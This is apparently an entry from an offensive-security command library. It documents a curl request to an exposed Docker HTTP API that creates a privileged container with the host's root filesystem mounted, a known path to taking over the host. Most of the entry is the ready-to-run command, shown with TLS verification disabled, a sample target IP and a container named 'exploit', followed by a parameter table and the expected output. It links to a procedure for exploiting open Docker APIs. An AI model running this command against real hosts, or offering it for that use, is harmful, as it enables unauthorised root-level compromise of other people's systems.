---
type: command
executor: bash
data: >-
  curl --insecure -X POST -H "Content-Type: application/json"
  https://$_DOCKER_HOST:2376/containers/create?name=$_CONTAINER_NAME -d
  '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "/dev/null"], "Binds": [
  "/:/mnt" ], "Privileged": true}'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - docker
  - creation
verified: true
validated: true
---

# curl-create-privileged-container

## Command

```bash
curl --insecure -X POST -H "Content-Type: application/json" https://$_DOCKER_HOST:2376/containers/create?name=$_CONTAINER_NAME -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

## Description

Creates a new privileged Alpine container via the Docker HTTP API, mounting the host filesystem and setting a persistent command to keep it running.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --insecure | Skip TLS cert verification | No |
| -X POST | HTTP POST method | Built-in |
| -H "Content-Type: application/json" | JSON request header | Yes |
| https://$_DOCKER_HOST:2376/containers/create | API endpoint | Yes |
| name=$_CONTAINER_NAME | Container name | Yes |
| -d '{...}' | JSON payload with image, cmd, binds, privileged | Yes |

## Examples

### Basic Usage

```bash
curl --insecure -X POST -H "Content-Type: application/json" https://10.10.10.10:2376/containers/create?name=exploit -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

### Advanced Usage

```bash
curl -X POST ... -d '{"Image":"ubuntu", "Cmd":["bash"], "HostConfig": {"Privileged": true}}'
```

## Expected Output

```json
{"Id":"abc123","Warnings":null}
```

## Related

- [[procedures/Exploit-Open-Docker-API-for-Container-Management]]
- [[tools/cURL]]
